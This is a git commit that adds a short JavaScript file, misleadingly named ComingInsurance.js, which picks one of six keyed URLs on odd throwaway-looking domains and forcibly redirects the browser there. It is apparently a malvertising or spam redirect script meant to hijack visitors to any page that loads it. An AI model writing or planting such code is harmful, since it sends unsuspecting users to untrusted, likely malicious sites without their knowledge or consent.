7946d2360740fdbe452ebfc7244225e368c53afb
insiala2f <84434303+insiala2f@users.noreply.github.com>
2022-03-17 12:52:16 +0700

    Create ComingInsurance.js

---
+++ ComingInsurance.js
@@ -0,0 +1,10 @@
+var dataUrl = [
+'//wavermerchandiseweird.com/qqqysyvbg?key=1d3303b4d7decb61514e9d25a740edfe',
+'//wavermerchandiseweird.com/tuf9tdkp?key=6729f99d594d33885cec1eb3981e92ac',
+'//wavermerchandiseweird.com/idt1y6nan?key=ce537f67a6c57e27e292db0da8179851',
+'//anomalousporch.com/e5ntk4vw2?key=afc46c163b5e7aa15937edf1b69b82cc',
+'//anomalousporch.com/fweeqvjv8d?key=d248834943f3e7e44e8f940e6f85f7e2',
+'//anomalousporch.com/s12ygwr4j?key=0c236aab12a231150e5db3f8b366197c'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
